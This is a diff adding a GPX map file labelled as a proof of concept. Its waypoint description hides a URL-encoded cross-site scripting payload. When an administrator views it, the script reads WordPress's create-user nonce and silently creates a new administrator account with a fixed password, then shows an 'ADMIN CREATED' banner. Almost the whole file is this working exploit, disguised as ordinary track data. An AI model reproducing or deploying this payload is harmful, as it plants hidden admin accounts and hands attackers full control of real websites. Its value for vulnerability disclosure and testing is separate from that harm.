@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<gpx version="1.1" creator="poc" xmlns="http://www.topografix.com/GPX/1/1">
+  <wpt lat="12.8000" lon="65.9000">
+    <name>IMPACTPOINT</name>
+    <desc>%3Cimg%20src%3Dx%20onerror%3D%27fetch%28%22%2Fwp-admin%2Fuser-new.php%22%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3E%7Bconst%20d%3Dnew%20DOMParser%28%29.parseFromString%28t%2C%22text%2Fhtml%22%29%3Bconst%20n%3Dd.querySelector%28%22%23_wpnonce_create-user%22%29.value%3Bconst%20b%3Dnew%20URLSearchParams%28%29%3Bb.set%28%22action%22%2C%22createuser%22%29%3Bb.set%28%22_wpnonce_create-user%22%2Cn%29%3Bb.set%28%22wp_http_referer%22%2C%22%2Fwp-admin%2Fuser-new.php%22%29%3Bb.set%28%22user_login%22%2C%22xssproof%22%29%3Bb.set%28%22email%22%2C%22xssproof%40example.com%22%29%3Bb.set%28%22pass1%22%2C%22Pwned%2112345%22%29%3Bb.set%28%22pass2%22%2C%22Pwned%2112345%22%29%3Bb.set%28%22role%22%2C%22administrator%22%29%3Breturn%20fetch%28%22%2Fwp-admin%2Fuser-new.php%22%2C%7Bmethod%3A%22POST%22%2Cbody%3Ab%7D%29%3B%7D%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3E%7Bconst%20h%3Ddocument.createElement%28%22h1%22%29%3Bh.id%3D%22xss-impact%22%3Bh.textContent%3D%22XSS%20IMPACT%3A%20ADMIN%20CREATED%22%3Bdocument.body.prepend%28h%29%3B%7D%29%3B%27%3E</desc>
+  </wpt>
+  <trk><name>impact</name><trkseg>
+    <trkpt lat="12.3456" lon="65.4321"><ele>1</ele></trkpt>
+    <trkpt lat="12.3466" lon="65.4331"><ele>2</ele></trkpt>
+  </trkseg></trk>
+</gpx>
